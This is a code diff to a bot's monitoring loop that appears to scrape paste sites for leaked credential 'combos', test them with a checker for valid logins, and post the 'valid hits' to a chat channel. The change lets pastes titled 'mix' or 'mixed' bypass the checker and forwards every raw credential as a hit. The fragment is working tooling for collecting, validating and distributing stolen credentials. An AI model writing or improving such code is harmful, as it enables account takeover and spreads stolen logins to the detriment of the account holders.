@@ -400,19 +400,26 @@ async def monitor_loop():
                             log.info(f"No content extracted from {url}")
 
                     if combined:
-                        # Flatten all creds and check them
+                        # Flatten all creds
                         all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
-                        log.info(f"Running {len(all_raw)} combos through checker...")
-                        try:
-                            status_msg = await content_channel.send(f"🔄 Checking {len(all_raw)} combos...")
-                        except Exception:
-                            status_msg = None
-                        valid_hits = await check_combos(all_raw, status_msg=status_msg)
+
+                        # Skip checking for mix files
+                        title_lower_check = " ".join(p["title"].lower() for p in new_pastes)
+                        if "mix" in title_lower_check or "mixed" in title_lower_check:
+                            log.info("Mix file detected, skipping checker")
+                            valid_hits = all_raw
+                        else:
+                            log.info(f"Running {len(all_raw)} combos through checker...")
+                            try:
+                                status_msg = await content_channel.send(f"🔄 Checking {len(all_raw)} combos...")
+                            except Exception:
+                                status_msg = None
+                            valid_hits = await check_combos(all_raw, status_msg=status_msg)
 
                         if not valid_hits:
                             log.info("No valid hits after checking, skipping post")
                         else:
-                            combined = ["\n".join(valid_hits)]  # replace with only valid hits
+                            combined = ["\n".join(valid_hits)]
 
                     if combined:
                         output      = "\n\n".join(combined)
